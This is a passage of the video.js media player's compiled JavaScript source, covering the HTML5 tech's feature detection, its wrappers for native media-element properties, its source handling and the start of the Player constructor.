Html5.prototype.featuresPlaybackRate = Html5.canControlPlaybackRate();

/**
 * Boolean indicating wether the `Tech` supports the `sourceset` event.
 *
 * @type {boolean}
 * @default
 */
Html5.prototype.featuresSourceset = Html5.canOverrideAttributes();

/**
 * Boolean indicating whether the `HTML5` tech currently supports the media element
 * moving in the DOM. iOS breaks if you move the media element, so this is set this to
 * false there. Everywhere else this should be true.
 *
 * @type {boolean}
 * @default
 */
Html5.prototype.movingMediaElementInDOM = !IS_IOS;

// TODO: Previous comment: No longer appears to be used. Can probably be removed.
//       Is this true?
/**
 * Boolean indicating whether the `HTML5` tech currently supports automatic media resize
 * when going into fullscreen.
 *
 * @type {boolean}
 * @default
 */
Html5.prototype.featuresFullscreenResize = true;

/**
 * Boolean indicating whether the `HTML5` tech currently supports the progress event.
 * If this is false, manual `progress` events will be triggred instead.
 *
 * @type {boolean}
 * @default
 */
Html5.prototype.featuresProgressEvents = true;

/**
 * Boolean indicating whether the `HTML5` tech currently supports the timeupdate event.
 * If this is false, manual `timeupdate` events will be triggred instead.
 *
 * @default
 */
Html5.prototype.featuresTimeupdateEvents = true;

/**
 * Boolean indicating whether the `HTML5` tech currently supports native `TextTrack`s.
 *
 * @type {boolean}
 * @default {@link Html5.supportsNativeTextTracks}
 */
Html5.prototype.featuresNativeTextTracks = Html5.supportsNativeTextTracks();

/**
 * Boolean indicating whether the `HTML5` tech currently supports native `VideoTrack`s.
 *
 * @type {boolean}
 * @default {@link Html5.supportsNativeVideoTracks}
 */
Html5.prototype.featuresNativeVideoTracks = Html5.supportsNativeVideoTracks();

/**
 * Boolean indicating whether the `HTML5` tech currently supports native `AudioTrack`s.
 *
 * @type {boolean}
 * @default {@link Html5.supportsNativeAudioTracks}
 */
Html5.prototype.featuresNativeAudioTracks = Html5.supportsNativeAudioTracks();

// HTML5 Feature detection and Device Fixes --------------------------------- //
var canPlayType = Html5.TEST_VID && Html5.TEST_VID.constructor.prototype.canPlayType;
var mpegurlRE = /^application\/(?:x-|vnd\.apple\.)mpegurl/i;
var mp4RE = /^video\/mp4/i;

Html5.patchCanPlayType = function () {

  // Android 4.0 and above can play HLS to some extent but it reports being unable to do so
  // Firefox and Chrome report correctly
  if (ANDROID_VERSION >= 4.0 && !IS_FIREFOX && !IS_CHROME) {
    Html5.TEST_VID.constructor.prototype.canPlayType = function (type) {
      if (type && mpegurlRE.test(type)) {
        return 'maybe';
      }
      return canPlayType.call(this, type);
    };

    // Override Android 2.2 and less canPlayType method which is broken
  } else if (IS_OLD_ANDROID) {
    Html5.TEST_VID.constructor.prototype.canPlayType = function (type) {
      if (type && mp4RE.test(type)) {
        return 'maybe';
      }
      return canPlayType.call(this, type);
    };
  }
};

Html5.unpatchCanPlayType = function () {
  var r = Html5.TEST_VID.constructor.prototype.canPlayType;

  Html5.TEST_VID.constructor.prototype.canPlayType = canPlayType;
  return r;
};

// by default, patch the media element
Html5.patchCanPlayType();

Html5.disposeMediaElement = function (el) {
  if (!el) {
    return;
  }

  if (el.parentNode) {
    el.parentNode.removeChild(el);
  }

  // remove any child track or source nodes to prevent their loading
  while (el.hasChildNodes()) {
    el.removeChild(el.firstChild);
  }

  // remove any src reference. not setting `src=''` because that causes a warning
  // in firefox
  el.removeAttribute('src');

  // force the media element to update its loading state by calling load()
  // however IE on Windows 7N has a bug that throws an error so need a try/catch (#793)
  if (typeof el.load === 'function') {
    // wrapping in an iife so it's not deoptimized (#1060#discussion_r10324473)
    (function () {
      try {
        el.load();
      } catch (e) {
        // not supported
      }
    })();
  }
};

Html5.resetMediaElement = function (el) {
  if (!el) {
    return;
  }

  var sources = el.querySelectorAll('source');
  var i = sources.length;

  while (i--) {
    el.removeChild(sources[i]);
  }

  // remove any src reference.
  // not setting `src=''` because that throws an error
  el.removeAttribute('src');

  if (typeof el.load === 'function') {
    // wrapping in an iife so it's not deoptimized (#1060#discussion_r10324473)
    (function () {
      try {
        el.load();
      } catch (e) {
        // satisfy linter
      }
    })();
  }
};

/* Native HTML5 element property wrapping ----------------------------------- */
// Wrap native boolean attributes with getters that check both property and attribute
// The list is as followed:
// muted, defaultMuted, autoplay, controls, loop, playsinline
[
/**
 * Get the value of `muted` from the media element. `muted` indicates
 * that the volume for the media should be set to silent. This does not actually change
 * the `volume` attribute.
 *
 * @method Html5#muted
 * @return {boolean}
 *         - True if the value of `volume` should be ignored and the audio set to silent.
 *         - False if the value of `volume` should be used.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-muted}
 */
'muted',

/**
 * Get the value of `defaultMuted` from the media element. `defaultMuted` indicates
 * whether the media should start muted or not. Only changes the default state of the
 * media. `muted` and `defaultMuted` can have different values. {@link Html5#muted} indicates the
 * current state.
 *
 * @method Html5#defaultMuted
 * @return {boolean}
 *         - The value of `defaultMuted` from the media element.
 *         - True indicates that the media should start muted.
 *         - False indicates that the media should not start muted
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-defaultmuted}
 */
'defaultMuted',

/**
 * Get the value of `autoplay` from the media element. `autoplay` indicates
 * that the media should start to play as soon as the page is ready.
 *
 * @method Html5#autoplay
 * @return {boolean}
 *         - The value of `autoplay` from the media element.
 *         - True indicates that the media should start as soon as the page loads.
 *         - False indicates that the media should not start as soon as the page loads.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#attr-media-autoplay}
 */
'autoplay',

/**
 * Get the value of `controls` from the media element. `controls` indicates
 * whether the native media controls should be shown or hidden.
 *
 * @method Html5#controls
 * @return {boolean}
 *         - The value of `controls` from the media element.
 *         - True indicates that native controls should be showing.
 *         - False indicates that native controls should be hidden.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#attr-media-controls}
 */
'controls',

/**
 * Get the value of `loop` from the media element. `loop` indicates
 * that the media should return to the start of the media and continue playing once
 * it reaches the end.
 *
 * @method Html5#loop
 * @return {boolean}
 *         - The value of `loop` from the media element.
 *         - True indicates that playback should seek back to start once
 *           the end of a media is reached.
 *         - False indicates that playback should not loop back to the start when the
 *           end of the media is reached.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#attr-media-loop}
 */
'loop',

/**
 * Get the value of `playsinline` from the media element. `playsinline` indicates
 * to the browser that non-fullscreen playback is preferred when fullscreen
 * playback is the native default, such as in iOS Safari.
 *
 * @method Html5#playsinline
 * @return {boolean}
 *         - The value of `playsinline` from the media element.
 *         - True indicates that the media should play inline.
 *         - False indicates that the media should not play inline.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/#attr-video-playsinline}
 */
'playsinline'].forEach(function (prop) {
  Html5.prototype[prop] = function () {
    return this.el_[prop] || this.el_.hasAttribute(prop);
  };
});

// Wrap native boolean attributes with setters that set both property and attribute
// The list is as followed:
// setMuted, setDefaultMuted, setAutoplay, setLoop, setPlaysinline
// setControls is special-cased above
[
/**
 * Set the value of `muted` on the media element. `muted` indicates that the current
 * audio level should be silent.
 *
 * @method Html5#setMuted
 * @param {boolean} muted
 *        - True if the audio should be set to silent
 *        - False otherwise
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-muted}
 */
'muted',

/**
 * Set the value of `defaultMuted` on the media element. `defaultMuted` indicates that the current
 * audio level should be silent, but will only effect the muted level on intial playback..
 *
 * @method Html5.prototype.setDefaultMuted
 * @param {boolean} defaultMuted
 *        - True if the audio should be set to silent
 *        - False otherwise
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-defaultmuted}
 */
'defaultMuted',

/**
 * Set the value of `autoplay` on the media element. `autoplay` indicates
 * that the media should start to play as soon as the page is ready.
 *
 * @method Html5#setAutoplay
 * @param {boolean} autoplay
 *         - True indicates that the media should start as soon as the page loads.
 *         - False indicates that the media should not start as soon as the page loads.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#attr-media-autoplay}
 */
'autoplay',

/**
 * Set the value of `loop` on the media element. `loop` indicates
 * that the media should return to the start of the media and continue playing once
 * it reaches the end.
 *
 * @method Html5#setLoop
 * @param {boolean} loop
 *         - True indicates that playback should seek back to start once
 *           the end of a media is reached.
 *         - False indicates that playback should not loop back to the start when the
 *           end of the media is reached.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#attr-media-loop}
 */
'loop',

/**
 * Set the value of `playsinline` from the media element. `playsinline` indicates
 * to the browser that non-fullscreen playback is preferred when fullscreen
 * playback is the native default, such as in iOS Safari.
 *
 * @method Html5#setPlaysinline
 * @param {boolean} playsinline
 *         - True indicates that the media should play inline.
 *         - False indicates that the media should not play inline.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/#attr-video-playsinline}
 */
'playsinline'].forEach(function (prop) {
  Html5.prototype['set' + toTitleCase(prop)] = function (v) {
    this.el_[prop] = v;

    if (v) {
      this.el_.setAttribute(prop, prop);
    } else {
      this.el_.removeAttribute(prop);
    }
  };
});

// Wrap native properties with a getter
// The list is as followed
// paused, currentTime, buffered, volume, poster, preload, error, seeking
// seekable, ended, playbackRate, defaultPlaybackRate, played, networkState
// readyState, videoWidth, videoHeight
[
/**
 * Get the value of `paused` from the media element. `paused` indicates whether the media element
 * is currently paused or not.
 *
 * @method Html5#paused
 * @return {boolean}
 *         The value of `paused` from the media element.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-paused}
 */
'paused',

/**
 * Get the value of `currentTime` from the media element. `currentTime` indicates
 * the current second that the media is at in playback.
 *
 * @method Html5#currentTime
 * @return {number}
 *         The value of `currentTime` from the media element.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-currenttime}
 */
'currentTime',

/**
 * Get the value of `buffered` from the media element. `buffered` is a `TimeRange`
 * object that represents the parts of the media that are already downloaded and
 * available for playback.
 *
 * @method Html5#buffered
 * @return {TimeRange}
 *         The value of `buffered` from the media element.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-buffered}
 */
'buffered',

/**
 * Get the value of `volume` from the media element. `volume` indicates
 * the current playback volume of audio for a media. `volume` will be a value from 0
 * (silent) to 1 (loudest and default).
 *
 * @method Html5#volume
 * @return {number}
 *         The value of `volume` from the media element. Value will be between 0-1.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-a-volume}
 */
'volume',

/**
 * Get the value of `poster` from the media element. `poster` indicates
 * that the url of an image file that can/will be shown when no media data is available.
 *
 * @method Html5#poster
 * @return {string}
 *         The value of `poster` from the media element. Value will be a url to an
 *         image.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#attr-video-poster}
 */
'poster',

/**
 * Get the value of `preload` from the media element. `preload` indicates
 * what should download before the media is interacted with. It can have the following
 * values:
 * - none: nothing should be downloaded
 * - metadata: poster and the first few frames of the media may be downloaded to get
 *   media dimensions and other metadata
 * - auto: allow the media and metadata for the media to be downloaded before
 *    interaction
 *
 * @method Html5#preload
 * @return {string}
 *         The value of `preload` from the media element. Will be 'none', 'metadata',
 *         or 'auto'.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#attr-media-preload}
 */
'preload',

/**
 * Get the value of the `error` from the media element. `error` indicates any
 * MediaError that may have occured during playback. If error returns null there is no
 * current error.
 *
 * @method Html5#error
 * @return {MediaError|null}
 *         The value of `error` from the media element. Will be `MediaError` if there
 *         is a current error and null otherwise.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-error}
 */
'error',

/**
 * Get the value of `seeking` from the media element. `seeking` indicates whether the
 * media is currently seeking to a new position or not.
 *
 * @method Html5#seeking
 * @return {boolean}
 *         - The value of `seeking` from the media element.
 *         - True indicates that the media is currently seeking to a new position.
 *         - Flase indicates that the media is not seeking to a new position at this time.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-seeking}
 */
'seeking',

/**
 * Get the value of `seekable` from the media element. `seekable` returns a
 * `TimeRange` object indicating ranges of time that can currently be `seeked` to.
 *
 * @method Html5#seekable
 * @return {TimeRange}
 *         The value of `seekable` from the media element. A `TimeRange` object
 *         indicating the current ranges of time that can be seeked to.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-seekable}
 */
'seekable',

/**
 * Get the value of `ended` from the media element. `ended` indicates whether
 * the media has reached the end or not.
 *
 * @method Html5#ended
 * @return {boolean}
 *         - The value of `ended` from the media element.
 *         - True indicates that the media has ended.
 *         - False indicates that the media has not ended.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-ended}
 */
'ended',

/**
 * Get the value of `playbackRate` from the media element. `playbackRate` indicates
 * the rate at which the media is currently playing back. Examples:
 *   - if playbackRate is set to 2, media will play twice as fast.
 *   - if playbackRate is set to 0.5, media will play half as fast.
 *
 * @method Html5#playbackRate
 * @return {number}
 *         The value of `playbackRate` from the media element. A number indicating
 *         the current playback speed of the media, where 1 is normal speed.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-playbackrate}
 */
'playbackRate',

/**
 * Get the value of `defaultPlaybackRate` from the media element. `defaultPlaybackRate` indicates
 * the rate at which the media is currently playing back. This value will not indicate the current
 * `playbackRate` after playback has started, use {@link Html5#playbackRate} for that.
 *
 * Examples:
 *   - if defaultPlaybackRate is set to 2, media will play twice as fast.
 *   - if defaultPlaybackRate is set to 0.5, media will play half as fast.
 *
 * @method Html5.prototype.defaultPlaybackRate
 * @return {number}
 *         The value of `defaultPlaybackRate` from the media element. A number indicating
 *         the current playback speed of the media, where 1 is normal speed.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-playbackrate}
 */
'defaultPlaybackRate',

/**
 * Get the value of `played` from the media element. `played` returns a `TimeRange`
 * object representing points in the media timeline that have been played.
 *
 * @method Html5#played
 * @return {TimeRange}
 *         The value of `played` from the media element. A `TimeRange` object indicating
 *         the ranges of time that have been played.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-played}
 */
'played',

/**
 * Get the value of `networkState` from the media element. `networkState` indicates
 * the current network state. It returns an enumeration from the following list:
 * - 0: NETWORK_EMPTY
 * - 1: NEWORK_IDLE
 * - 2: NETWORK_LOADING
 * - 3: NETWORK_NO_SOURCE
 *
 * @method Html5#networkState
 * @return {number}
 *         The value of `networkState` from the media element. This will be a number
 *         from the list in the description.
 *
 * @see [Spec] {@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-networkstate}
 */
'networkState',

/**
 * Get the value of `readyState` from the media element. `readyState` indicates
 * the current state of the media element. It returns an enumeration from the
 * following list:
 * - 0: HAVE_NOTHING
 * - 1: HAVE_METADATA
 * - 2: HAVE_CURRENT_DATA
 * - 3: HAVE_FUTURE_DATA
 * - 4: HAVE_ENOUGH_DATA
 *
 * @method Html5#readyState
 * @return {number}
 *         The value of `readyState` from the media element. This will be a number
 *         from the list in the description.
 *
 * @see [Spec] {@link https://www.w3.org/TR/html5/embedded-content-0.html#ready-states}
 */
'readyState',

/**
 * Get the value of `videoWidth` from the video element. `videoWidth` indicates
 * the current width of the video in css pixels.
 *
 * @method Html5#videoWidth
 * @return {number}
 *         The value of `videoWidth` from the video element. This will be a number
 *         in css pixels.
 *
 * @see [Spec] {@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-video-videowidth}
 */
'videoWidth',

/**
 * Get the value of `videoHeight` from the video element. `videoHeigth` indicates
 * the current height of the video in css pixels.
 *
 * @method Html5#videoHeight
 * @return {number}
 *         The value of `videoHeight` from the video element. This will be a number
 *         in css pixels.
 *
 * @see [Spec] {@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-video-videowidth}
 */
'videoHeight'].forEach(function (prop) {
  Html5.prototype[prop] = function () {
    return this.el_[prop];
  };
});

// Wrap native properties with a setter in this format:
// set + toTitleCase(name)
// The list is as follows:
// setVolume, setSrc, setPoster, setPreload, setPlaybackRate, setDefaultPlaybackRate
[
/**
 * Set the value of `volume` on the media element. `volume` indicates the current
 * audio level as a percentage in decimal form. This means that 1 is 100%, 0.5 is 50%, and
 * so on.
 *
 * @method Html5#setVolume
 * @param {number} percentAsDecimal
 *        The volume percent as a decimal. Valid range is from 0-1.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-a-volume}
 */
'volume',

/**
 * Set the value of `src` on the media element. `src` indicates the current
 * {@link Tech~SourceObject} for the media.
 *
 * @method Html5#setSrc
 * @param {Tech~SourceObject} src
 *        The source object to set as the current source.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-src}
 */
'src',

/**
 * Set the value of `poster` on the media element. `poster` is the url to
 * an image file that can/will be shown when no media data is available.
 *
 * @method Html5#setPoster
 * @param {string} poster
 *        The url to an image that should be used as the `poster` for the media
 *        element.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#attr-media-poster}
 */
'poster',

/**
 * Set the value of `preload` on the media element. `preload` indicates
 * what should download before the media is interacted with. It can have the following
 * values:
 * - none: nothing should be downloaded
 * - metadata: poster and the first few frames of the media may be downloaded to get
 *   media dimensions and other metadata
 * - auto: allow the media and metadata for the media to be downloaded before
 *    interaction
 *
 * @method Html5#setPreload
 * @param {string} preload
 *         The value of `preload` to set on the media element. Must be 'none', 'metadata',
 *         or 'auto'.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#attr-media-preload}
 */
'preload',

/**
 * Set the value of `playbackRate` on the media element. `playbackRate` indicates
 * the rate at which the media should play back. Examples:
 *   - if playbackRate is set to 2, media will play twice as fast.
 *   - if playbackRate is set to 0.5, media will play half as fast.
 *
 * @method Html5#setPlaybackRate
 * @return {number}
 *         The value of `playbackRate` from the media element. A number indicating
 *         the current playback speed of the media, where 1 is normal speed.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-playbackrate}
 */
'playbackRate',

/**
 * Set the value of `defaultPlaybackRate` on the media element. `defaultPlaybackRate` indicates
 * the rate at which the media should play back upon initial startup. Changing this value
 * after a video has started will do nothing. Instead you should used {@link Html5#setPlaybackRate}.
 *
 * Example Values:
 *   - if playbackRate is set to 2, media will play twice as fast.
 *   - if playbackRate is set to 0.5, media will play half as fast.
 *
 * @method Html5.prototype.setDefaultPlaybackRate
 * @return {number}
 *         The value of `defaultPlaybackRate` from the media element. A number indicating
 *         the current playback speed of the media, where 1 is normal speed.
 *
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-defaultplaybackrate}
 */
'defaultPlaybackRate'].forEach(function (prop) {
  Html5.prototype['set' + toTitleCase(prop)] = function (v) {
    this.el_[prop] = v;
  };
});

// wrap native functions with a function
// The list is as follows:
// pause, load play
[
/**
 * A wrapper around the media elements `pause` function. This will call the `HTML5`
 * media elements `pause` function.
 *
 * @method Html5#pause
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-pause}
 */
'pause',

/**
 * A wrapper around the media elements `load` function. This will call the `HTML5`s
 * media element `load` function.
 *
 * @method Html5#load
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-load}
 */
'load',

/**
 * A wrapper around the media elements `play` function. This will call the `HTML5`s
 * media element `play` function.
 *
 * @method Html5#play
 * @see [Spec]{@link https://www.w3.org/TR/html5/embedded-content-0.html#dom-media-play}
 */
'play'].forEach(function (prop) {
  Html5.prototype[prop] = function () {
    return this.el_[prop]();
  };
});

Tech.withSourceHandlers(Html5);

/**
 * Native source handler for Html5, simply passes the source to the media element.
 *
 * @proprety {Tech~SourceObject} source
 *        The source object
 *
 * @proprety {Html5} tech
 *        The instance of the HTML5 tech.
 */
Html5.nativeSourceHandler = {};

/**
 * Check if the media element can play the given mime type.
 *
 * @param {string} type
 *        The mimetype to check
 *
 * @return {string}
 *         'probably', 'maybe', or '' (empty string)
 */
Html5.nativeSourceHandler.canPlayType = function (type) {
  // IE9 on Windows 7 without MediaPlayer throws an error here
  // https://github.com/videojs/video.js/issues/519
  try {
    return Html5.TEST_VID.canPlayType(type);
  } catch (e) {
    return '';
  }
};

/**
 * Check if the media element can handle a source natively.
 *
 * @param {Tech~SourceObject} source
 *         The source object
 *
 * @param {Object} [options]
 *         Options to be passed to the tech.
 *
 * @return {string}
 *         'probably', 'maybe', or '' (empty string).
 */
Html5.nativeSourceHandler.canHandleSource = function (source, options) {

  // If a type was provided we should rely on that
  if (source.type) {
    return Html5.nativeSourceHandler.canPlayType(source.type);

    // If no type, fall back to checking 'video/[EXTENSION]'
  } else if (source.src) {
    var ext = getFileExtension(source.src);

    return Html5.nativeSourceHandler.canPlayType('video/' + ext);
  }

  return '';
};

/**
 * Pass the source to the native media element.
 *
 * @param {Tech~SourceObject} source
 *        The source object
 *
 * @param {Html5} tech
 *        The instance of the Html5 tech
 *
 * @param {Object} [options]
 *        The options to pass to the source
 */
Html5.nativeSourceHandler.handleSource = function (source, tech, options) {
  tech.setSrc(source.src);
};

/**
 * A noop for the native dispose function, as cleanup is not needed.
 */
Html5.nativeSourceHandler.dispose = function () {};

// Register the native source handler
Html5.registerSourceHandler(Html5.nativeSourceHandler);

Tech.registerTech('Html5', Html5);

var _templateObject$1 = taggedTemplateLiteralLoose(['\n        Using the tech directly can be dangerous. I hope you know what you\'re doing.\n        See https://github.com/videojs/video.js/issues/2617 for more info.\n      '], ['\n        Using the tech directly can be dangerous. I hope you know what you\'re doing.\n        See https://github.com/videojs/video.js/issues/2617 for more info.\n      ']);

/**
 * @file player.js
 */
// Subclasses Component
// The following imports are used only to ensure that the corresponding modules
// are always included in the video.js package. Importing the modules will
// execute them and they will register themselves with video.js.
// Import Html5 tech, at least for disposing the original video tag.
// The following tech events are simply re-triggered
// on the player when they happen
var TECH_EVENTS_RETRIGGER = [
/**
 * Fired while the user agent is downloading media data.
 *
 * @event Player#progress
 * @type {EventTarget~Event}
 */
/**
 * Retrigger the `progress` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechProgress_
 * @fires Player#progress
 * @listens Tech#progress
 */
'progress',

/**
 * Fires when the loading of an audio/video is aborted.
 *
 * @event Player#abort
 * @type {EventTarget~Event}
 */
/**
 * Retrigger the `abort` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechAbort_
 * @fires Player#abort
 * @listens Tech#abort
 */
'abort',

/**
 * Fires when the browser is intentionally not getting media data.
 *
 * @event Player#suspend
 * @type {EventTarget~Event}
 */
/**
 * Retrigger the `suspend` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechSuspend_
 * @fires Player#suspend
 * @listens Tech#suspend
 */
'suspend',

/**
 * Fires when the current playlist is empty.
 *
 * @event Player#emptied
 * @type {EventTarget~Event}
 */
/**
 * Retrigger the `emptied` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechEmptied_
 * @fires Player#emptied
 * @listens Tech#emptied
 */
'emptied',
/**
 * Fires when the browser is trying to get media data, but data is not available.
 *
 * @event Player#stalled
 * @type {EventTarget~Event}
 */
/**
 * Retrigger the `stalled` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechStalled_
 * @fires Player#stalled
 * @listens Tech#stalled
 */
'stalled',

/**
 * Fires when the browser has loaded meta data for the audio/video.
 *
 * @event Player#loadedmetadata
 * @type {EventTarget~Event}
 */
/**
 * Retrigger the `stalled` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechLoadedmetadata_
 * @fires Player#loadedmetadata
 * @listens Tech#loadedmetadata
 */
'loadedmetadata',

/**
 * Fires when the browser has loaded the current frame of the audio/video.
 *
 * @event Player#loadeddata
 * @type {event}
 */
/**
 * Retrigger the `loadeddata` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechLoaddeddata_
 * @fires Player#loadeddata
 * @listens Tech#loadeddata
 */
'loadeddata',

/**
 * Fires when the current playback position has changed.
 *
 * @event Player#timeupdate
 * @type {event}
 */
/**
 * Retrigger the `timeupdate` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechTimeUpdate_
 * @fires Player#timeupdate
 * @listens Tech#timeupdate
 */
'timeupdate',

/**
 * Fires when the video's intrinsic dimensions change
 *
 * @event Player#resize
 * @type {event}
 */
/**
 * Retrigger the `resize` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechResize_
 * @fires Player#resize
 * @listens Tech#resize
 */
'resize',

/**
 * Fires when the volume has been changed
 *
 * @event Player#volumechange
 * @type {event}
 */
/**
 * Retrigger the `volumechange` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechVolumechange_
 * @fires Player#volumechange
 * @listens Tech#volumechange
 */
'volumechange',

/**
 * Fires when the text track has been changed
 *
 * @event Player#texttrackchange
 * @type {event}
 */
/**
 * Retrigger the `texttrackchange` event that was triggered by the {@link Tech}.
 *
 * @private
 * @method Player#handleTechTexttrackchange_
 * @fires Player#texttrackchange
 * @listens Tech#texttrackchange
 */
'texttrackchange'];

// events to queue when playback rate is zero
// this is a hash for the sole purpose of mapping non-camel-cased event names
// to camel-cased function names
var TECH_EVENTS_QUEUE = {
  canplay: 'CanPlay',
  canplaythrough: 'CanPlayThrough',
  playing: 'Playing',
  seeked: 'Seeked'
};

/**
 * An instance of the `Player` class is created when any of the Video.js setup methods
 * are used to initialize a video.
 *
 * After an instance has been created it can be accessed globally in two ways:
 * 1. By calling `videojs('example_video_1');`
 * 2. By using it directly via  `videojs.players.example_video_1;`
 *
 * @extends Component
 */

var Player = function (_Component) {
  inherits(Player, _Component);

  /**
   * Create an instance of this class.
   *
   * @param {Element} tag
   *        The original video DOM element used for configuring options.
   *
   * @param {Object} [options]
   *        Object of option names and values.
   *
   * @param {Component~ReadyCallback} [ready]
   *        Ready callback function.
   */
  function Player(tag, options, ready) {
    classCallCheck(this, Player);

    // Make sure tag ID exists
    tag.id = tag.id || options.id || 'vjs_video_' + newGUID();

    // Set Options
    // The options argument overrides options set in the video tag
    // which overrides globally set options.
    // This latter part coincides with the load order
    // (tag must exist before Player)
    options = assign(Player.getTagSettings(tag), options);

    // Delay the initialization of children because we need to set up
    // player properties first, and can't use `this` before `super()`
    options.initChildren = false;

    // Same with creating the element
    options.createEl = false;

    // don't auto mixin the evented mixin
    options.evented = false;

    // we don't want the player to report touch activity on itself
    // see enableTouchActivity in Component
    options.reportTouchActivity = false;

    // If language is not set, get the closest lang attribute
    if (!options.language) {
      if (typeof tag.closest === 'function') {
        var closest = tag.closest('[lang]');

        if (closest && closest.getAttribute) {
          options.language = closest.getAttribute('lang');
        }
      } else {
        var element = tag;

        while (element && element.nodeType === 1) {
          if (getAttributes(element).hasOwnProperty('lang')) {
            options.language = element.getAttribute('lang');
            break;
          }
          element = element.parentNode;
        }
      }
    }

    // Run base component initializing with new options

    // Tracks when a tech changes the poster
    var _this = possibleConstructorReturn(this, _Component.call(this, null, options, ready));

    _this.isPosterFromTech_ = false;

    // Holds callback info that gets queued when playback rate is zero
    // and a seek is happening
    _this.queuedCallbacks_ = [];

    // Turn off API access because we're loading a new tech that might load asynchronously
    _this.isReady_ = false;

    // Init state hasStarted_
    _this.hasStarted_ = false;

    // Init state userActive_
    _this.userActive_ = false;

    // if the global option object was accidentally blown away by
    // someone, bail early with an informative error
    if (!_this.options_ || !_this.options_.techOrder || !_this.options_.techOrder.length) {
      throw new Error('No techOrder specified. Did you overwrite ' + 'videojs.options instead of just changing the ' + 'properties you want to override?');
    }

    // Store the original tag used to set options
    _this.tag = tag;

    // Store the tag attributes used to restore html5 element
    _this.tagAttributes = tag && getAttributes(tag);

    // Update current language
    _this.language(_this.options_.language);

    // Update Supported Languages
    if (options.languages) {
      // Normalise player option languages to lowercase
      var languagesToLower = {};

      Object.getOwnPropertyNames(options.languages).forEach(function (name$$1) {
        languagesToLower[name$$1.toLowerCase()] = options.languages[name$$1];
      });
      _this.languages_ = languagesToLower;
    } else {
      _this.languages_ = Player.prototype.options_.languages;
    }

    // Cache for video property values.
    _this.cache_ = {};

    // Set poster
    _this.poster_ = options.poster || '';

    // Set controls
    _this.controls_ = !!options.controls;

    // Set default values for lastVolume
    _this.cache_.lastVolume = 1;

    // Original tag settings stored in options
    // now remove immediately so native controls don't flash.
    // May be turned back on by HTML5 tech if nativeControlsForTouch is true
    tag.controls = false;
    tag.removeAttribute('controls');

    /*
     * Store the internal state of scrubbing
     *
     * @private
     * @return {Boolean} True if the user is scrubbing
     */
    _this.scrubbing_ = false;

    _this.el_ = _this.createEl();

    // Set default value for lastPlaybackRate
    _this.cache_.lastPlaybackRate = _this.defaultPlaybackRate();

    // Make this an evented object and use `el_` as its event bus.
    evented(_this, { eventBusKey: 'el_' });

    // We also want to pass the original player options to each component and plugin
    // as well so they don't need to reach back into the player for options later.
    // We also need to do another copy of this.options_ so we don't end up with
    // an infinite loop.
    var playerOptionsCopy = mergeOptions(_this.options_);

    // Load plugins
    if (options.plugins) {
      var plugins = options.plugins;

      Object.keys(plugins).forEach(function (name$$1) {
        if (typeof this[name$$1] === 'function') {
          this[name$$1](plugins[name$$1]);
        } else {
          throw new Error('plugin "' + name$$1 + '" does not exist');
        }
      }, _this);
    }

    _this.options_.playerOptions = playerOptionsCopy;

    _this.middleware_ = [];

    _this.initChildren();

    // Set isAudio based on whether or not an audio tag was used
    _this.isAudio(tag.nodeName.toLowerCase() === 'audio');

    // Update controls className. Can't do this when the controls are initially
    // set because the element doesn't exist yet.
